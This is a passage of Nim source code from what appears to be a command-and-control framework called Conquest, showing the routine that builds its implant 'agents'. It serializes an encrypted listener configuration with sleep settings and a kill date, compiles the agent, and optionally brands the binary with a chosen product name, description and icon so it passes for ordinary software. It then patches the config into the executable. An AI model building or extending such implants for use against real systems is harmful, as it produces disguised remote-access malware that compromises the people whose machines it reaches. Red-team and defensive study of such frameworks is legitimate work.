    cq.info(fmt"Configuration size: {config.len} bytes")
    cq.client.sendBuildlogItem(LOG_INFO_SHORT, fmt"Configuration serialized ({config.len} bytes).")

    # Update nim.cfg with placeholder (use custom config if provided)
    if not cq.updateImperatorCfgPlaceholder(config.len(), agentBuildInformation.verbose, agentBuildInformation.outputFormat, agentBuildInformation.nimCfgContent):
        return @[]

    # Generate and compile resource file if metadata provided
    var resPath = ""
    let metadata = agentBuildInformation.metadata
    if metadata != nil and
       (metadata.productName.len > 0 or metadata.fileDescription.len > 0 or
        (metadata.iconPath != "None" and metadata.iconPath.len > 0)):

        # Ensure temp directory exists
        let tempDir = fmt"{CONQUEST_ROOT}/temp"
        if not dirExists(tempDir):
            createDir(tempDir)

        let rcPath = fmt"{tempDir}/resource.rc"
        resPath = fmt"{tempDir}/resource.res"

        # Resolve icon path - predefined icons are stored in resources/icons/
        var resolvedMetadata = metadata
        if not metadata.useCustomIcon and metadata.iconPath != "None" and metadata.iconPath.len > 0:
            # Predefined icon - resolve to full path
            let iconName = metadata.iconPath.toLowerAscii()
            resolvedMetadata.iconPath = fmt"{CONQUEST_ROOT}/resources/icons/{iconName}.ico"
            cq.info(fmt"Using predefined icon: {resolvedMetadata.iconPath}")

        if not cq.generateResourceFile(resolvedMetadata, rcPath):
            cq.error("Failed to generate resource file")
            cq.client.sendBuildlogItem(LOG_ERROR_SHORT, "Failed to generate resource file")
            return @[]

        if not cq.compileResourceFile(rcPath, resPath):
            cq.error("Failed to compile resource file")
            cq.client.sendBuildlogItem(LOG_ERROR_SHORT, "Failed to compile resource file")
            return @[]

        cq.client.sendBuildlogItem(LOG_INFO_SHORT, "Resource file compiled.")

    # Compile with optional resource file
    let outPath = cq.compileImperator(agentBuildInformation.outputFormat, resPath)
    if outPath.isEmptyOrWhitespace():
        return @[]

    # Patch encrypted configuration into binary
    return cq.patch(outPath, config)

# Agent generation
proc agentBuild*(cq: Conquest, agentBuildInformation: AgentBuildInformation): seq[byte] =

    cq.info(fmt"agentBuild called with agentType: {agentBuildInformation.agentType}")
    cq.client.sendBuildlogItem(LOG_INFO_SHORT, fmt"Agent type: {agentBuildInformation.agentType}")

    case agentBuildInformation.agentType:
    of AGENT_IMPERATOR:
        return cq.imperatorAgentBuild(agentBuildInformation)

    of AGENT_MONARCH:
        # Existing Monarch build logic
        # Verify that listener exists
        if not cq.dbListenerExists(agentBuildInformation.listenerId):
            cq.error(fmt"Listener {agentBuildInformation.listenerId} does not exist.")
            return

        let listener = cq.listeners[agentBuildInformation.listenerId]

        var config = cq.serializeConfiguration(listener, agentBuildInformation.sleepSettings, agentBuildInformation.killDate)

        let unpatchedExePath = cq.compile(config.len(), agentBuildInformation.modules, agentBuildInformation.verbose, agentBuildInformation.architecture, agentBuildInformation.nimCfgContent)
        if unpatchedExePath.isEmptyOrWhitespace():
            return

        # Return packet to send to client
        return cq.patch(unpatchedExePath, config)